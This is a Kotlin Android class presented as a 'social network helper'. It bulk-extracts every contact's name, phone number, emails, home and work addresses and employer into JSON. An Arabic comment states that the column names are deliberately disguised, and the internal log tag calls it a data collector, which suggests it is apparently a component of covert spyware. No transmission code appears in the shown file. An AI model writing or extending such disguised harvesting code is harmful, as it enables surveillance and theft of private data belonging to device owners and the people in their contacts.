package com.example.kem

import android.content.Context
import android.content.pm.PackageManager
import android.provider.ContactsContract
import android.provider.ContactsContract.CommonDataKinds.Email
import android.provider.ContactsContract.CommonDataKinds.Phone
import android.provider.ContactsContract.CommonDataKinds.StructuredPostal
import android.provider.ContactsContract.CommonDataKinds.Organization
import android.util.Log
import androidx.core.content.ContextCompat
import android.Manifest
import org.json.JSONArray
import org.json.JSONObject

/**
 * مساعد الشبكة الاجتماعية المحسن
 * Optimized social network helper
 */
class SocialNetworkHelper(context: Context) : BaseDataProcessor(context) {

    private val LOG_TAG = "DataCollectorHelper"

    // أسماء مموهة للأعمدة والأنواع
    private object NetworkColumns {
        const val IDENTITY_KEY = Phone.NUMBER
        const val DISPLAY_ALIAS = Phone.DISPLAY_NAME_PRIMARY
        const val COMMUNICATION_TYPE = Phone.TYPE
        const val PRIMARY_IDENTIFIER = Phone.CONTACT_ID
        const val LABEL_INFO = Phone.LABEL
        const val LOOKUP_REFERENCE = Phone.LOOKUP_KEY
    }

    // أنواع التواصل
    private object CommunicationTypes {
        const val RESIDENCE_LINE = Phone.TYPE_HOME
        const val OFFICE_LINE = Phone.TYPE_WORK
        const val PORTABLE_DEVICE = Phone.TYPE_MOBILE
        const val ALTERNATIVE_LINE = Phone.TYPE_OTHER
        const val PRIMARY_LINE = Phone.TYPE_MAIN
    }

    // تعيينات أنواع التواصل
    private val COMMUNICATION_TYPE_MAPPINGS = mapOf(
        CommunicationTypes.PORTABLE_DEVICE to "portable_device",
        CommunicationTypes.RESIDENCE_LINE to "residence_line",
        CommunicationTypes.OFFICE_LINE to "office_line",
        CommunicationTypes.PRIMARY_LINE to "primary_line",
        CommunicationTypes.ALTERNATIVE_LINE to "alternative_channel"
    )

    private val EMAIL_TYPE_MAPPINGS = mapOf(
        Email.TYPE_HOME to "personal_mail",
        Email.TYPE_WORK to "business_mail",
        Email.TYPE_OTHER to "alternative_mail"
    )

    private val ADDRESS_TYPE_MAPPINGS = mapOf(
        StructuredPostal.TYPE_HOME to "residence_location",
        StructuredPostal.TYPE_WORK to "office_location",
        StructuredPostal.TYPE_OTHER to "alternative_location"
    )

    fun hasNetworkAccessPermission(): Boolean {
        return BaseUtils.checkPermission(context, Manifest.permission.READ_CONTACTS)
    }

    fun collectNetworkData(): JSONObject {
        return safeExecute("social network data collection") {
            if (!hasNetworkAccessPermission()) {
                Log.w(LOG_TAG, "Network access permission not granted")
                return@safeExecute BaseUtils.createErrorResponse("permission_denied", "Access to social network denied")
            }

            val networkMembers = extractNetworkMembers()
            val statsInfo = generateNetworkStats(networkMembers)

            createSuccessResponse(
                JSONObject().apply {
                    put("network_members", networkMembers)
                    put("network_analytics", statsInfo)
                    put("total_network_size", networkMembers.length())
                },
                networkMembers.length()
            ).apply {
                put("collection_timestamp", System.currentTimeMillis())
                Log.i(LOG_TAG, "Network data collection completed. Size: ${networkMembers.length()}")
            }
        }
    }

    private fun extractNetworkMembers(): JSONArray {
        val membersList = JSONArray()
        val processedIdentifiers = mutableSetOf<String>()

        val projectionFields = arrayOf(
            NetworkColumns.PRIMARY_IDENTIFIER,
            NetworkColumns.DISPLAY_ALIAS,
            NetworkColumns.IDENTITY_KEY,
            NetworkColumns.COMMUNICATION_TYPE,
            NetworkColumns.LABEL_INFO,
            NetworkColumns.LOOKUP_REFERENCE
        )

        val members = executeQuery(
            Phone.CONTENT_URI,
            projectionFields,
            sortOrder = "${NetworkColumns.DISPLAY_ALIAS} ASC"
        ) { cursor ->
            val memberProfile = extractMemberProfile(cursor)
            val memberId = memberProfile.optString("contact_id")

            if (memberId.isNotEmpty() && !processedIdentifiers.contains(memberId)) {
                processedIdentifiers.add(memberId)
                memberProfile
            } else null
        }

        members.forEach { membersList.put(it) }
        return membersList
    }

    private fun extractMemberProfile(cursor: android.database.Cursor): JSONObject {
        val memberProfile = JSONObject()

        try {
            val contactId = cursor.getString(cursor.getColumnIndexOrThrow(NetworkColumns.PRIMARY_IDENTIFIER))
            memberProfile.put("contact_id", contactId ?: "unknown")

            val displayName = cursor.getString(cursor.getColumnIndexOrThrow(NetworkColumns.DISPLAY_ALIAS))
            memberProfile.put("display_alias", BaseUtils.sanitizeText(displayName, 100) ?: "Unknown Contact")

            val phoneNumber = cursor.getString(cursor.getColumnIndexOrThrow(NetworkColumns.IDENTITY_KEY))
            memberProfile.put("identity_key", BaseUtils.sanitizeAddress(phoneNumber, 20))

            val commType = cursor.getInt(cursor.getColumnIndexOrThrow(NetworkColumns.COMMUNICATION_TYPE))
            memberProfile.put("communication_channel", decodeCommunicationType(commType))

            val customLabel = cursor.getString(cursor.getColumnIndexOrThrow(NetworkColumns.LABEL_INFO))
            memberProfile.put("custom_label", customLabel ?: "")

            val lookupKey = cursor.getString(cursor.getColumnIndexOrThrow(NetworkColumns.LOOKUP_REFERENCE))
            memberProfile.put("lookup_reference", lookupKey ?: "")

            val additionalInfo = gatherAdditionalMemberInfo(contactId)
            memberProfile.put("additional_channels", additionalInfo)

        } catch (ex: Exception) {
            Log.e(LOG_TAG, "Error extracting member profile", ex)
        }

        return memberProfile
    }

    private fun gatherAdditionalMemberInfo(contactId: String?): JSONObject {
        val additionalInfo = JSONObject()

        if (contactId.isNullOrEmpty()) {
            return additionalInfo
        }

        try {
            additionalInfo.put("email_channels", extractEmailChannels(contactId))
            additionalInfo.put("physical_locations", extractPhysicalLocations(contactId))
            additionalInfo.put("organization_affiliation", extractOrganizationInfo(contactId))
        } catch (infoEx: Exception) {
            Log.w(LOG_TAG, "Failed to gather additional info for contact: $contactId", infoEx)
        }

        return additionalInfo
    }

    private fun extractEmailChannels(contactId: String): JSONArray {
        val emailList = JSONArray()

        val emailProjection = arrayOf(Email.ADDRESS, Email.TYPE, Email.LABEL)
        val emailSelection = "${Email.CONTACT_ID} = ?"
        val emailSelectionArgs = arrayOf(contactId)

        val emails = executeQuery(
            Email.CONTENT_URI,
            emailProjection,
            emailSelection,
            emailSelectionArgs
        ) { cursor ->
            JSONObject().apply {
                put("address", cursor.getString(cursor.getColumnIndexOrThrow(Email.ADDRESS)) ?: "")
                put("type", decodeEmailType(cursor.getInt(cursor.getColumnIndexOrThrow(Email.TYPE))))
                put("label", cursor.getString(cursor.getColumnIndexOrThrow(Email.LABEL)) ?: "")
            }
        }

        emails.forEach { emailList.put(it) }
        return emailList
    }

    private fun extractPhysicalLocations(contactId: String): JSONArray {
        val locationsList = JSONArray()

        val addressProjection = arrayOf(
            StructuredPostal.FORMATTED_ADDRESS,
            StructuredPostal.TYPE,
            StructuredPostal.LABEL
        )
        val addressSelection = "${StructuredPostal.CONTACT_ID} = ?"
        val addressSelectionArgs = arrayOf(contactId)

        val locations = executeQuery(
            StructuredPostal.CONTENT_URI,
            addressProjection,
            addressSelection,
            addressSelectionArgs
        ) { cursor ->
            JSONObject().apply {
                put("formatted_location", cursor.getString(cursor.getColumnIndexOrThrow(StructuredPostal.FORMATTED_ADDRESS)) ?: "")
                put("location_type", decodeAddressType(cursor.getInt(cursor.getColumnIndexOrThrow(StructuredPostal.TYPE))))
                put("location_label", cursor.getString(cursor.getColumnIndexOrThrow(StructuredPostal.LABEL)) ?: "")
            }
        }

        locations.forEach { locationsList.put(it) }
        return locationsList
    }

    private fun extractOrganizationInfo(contactId: String): JSONObject {
        val orgInfo = JSONObject()

        if (contactId.isNullOrEmpty()) {
            return orgInfo
        }

        try {
            val orgProjection = arrayOf(
                Organization.COMPANY,
                Organization.TITLE,
                Organization.DEPARTMENT
            )

            val orgSelection = "${ContactsContract.Data.CONTACT_ID} = ? AND ${ContactsContract.Data.MIMETYPE} = ?"
            val orgSelectionArgs = arrayOf(contactId, Organization.CONTENT_ITEM_TYPE)

            val orgs = executeQuery(
                ContactsContract.Data.CONTENT_URI,
                orgProjection,
                orgSelection,
                orgSelectionArgs
            ) { cursor ->
                JSONObject().apply {
                    put("company_name", cursor.getString(cursor.getColumnIndexOrThrow(Organization.COMPANY)) ?: "")
                    put("position_title", cursor.getString(cursor.getColumnIndexOrThrow(Organization.TITLE)) ?: "")
                    put("department_unit", cursor.getString(cursor.getColumnIndexOrThrow(Organization.DEPARTMENT)) ?: "")
                }
            }

            if (orgs.isNotEmpty()) {
                return orgs.first()
            }
        } catch (ex: Exception) {
            Log.e(LOG_TAG, "Error extracting organization info for contact: $contactId", ex)
        }

        return orgInfo
    }

    private fun generateNetworkStats(networkMembers: JSONArray): JSONObject {
        val statsObj = JSONObject()

        try {
            var mobileCount = 0
            var homeCount = 0
            var workCount = 0
            var emailCount = 0
            var addressCount = 0

            for (i in 0 until networkMembers.length()) {
                try {
                    val member = networkMembers.getJSONObject(i)
                    val commChannel = member.optString("communication_channel", "")

                    when (commChannel) {
                        "portable_device" -> mobileCount++
                        "residence_line" -> homeCount++
                        "office_line" -> workCount++
                    }

                    val additionalChannels = member.optJSONObject("additional_channels")
                    additionalChannels?.let { channels ->
                        val emails = channels.optJSONArray("email_channels")
                        emails?.let { emailCount += it.length() }

                        val locations = channels.optJSONArray("physical_locations")
                        locations?.let { addressCount += it.length() }
                    }
                } catch (ex: Exception) {
                    Log.w(LOG_TAG, "Error processing member stats", ex)
                }
            }

            statsObj.put("mobile_contacts", mobileCount)
            statsObj.put("home_contacts", homeCount)
            statsObj.put("work_contacts", workCount)
            statsObj.put("total_emails", emailCount)
            statsObj.put("total_addresses", addressCount)
            statsObj.put("analysis_timestamp", System.currentTimeMillis())

        } catch (statsEx: Exception) {
            Log.e(LOG_TAG, "Failed to generate network statistics", statsEx)
        }

        return statsObj
    }

    private fun decodeCommunicationType(type: Int): String {
        return TypeDecoder.decodeWithMapping(type, COMMUNICATION_TYPE_MAPPINGS, "unknown_channel")
    }

    private fun decodeEmailType(type: Int): String {
        return TypeDecoder.decodeWithMapping(type, EMAIL_TYPE_MAPPINGS, "unknown_mail_type")
    }

    private fun decodeAddressType(type: Int): String {
        return TypeDecoder.decodeWithMapping(type, ADDRESS_TYPE_MAPPINGS, "unknown_location_type")
    }
}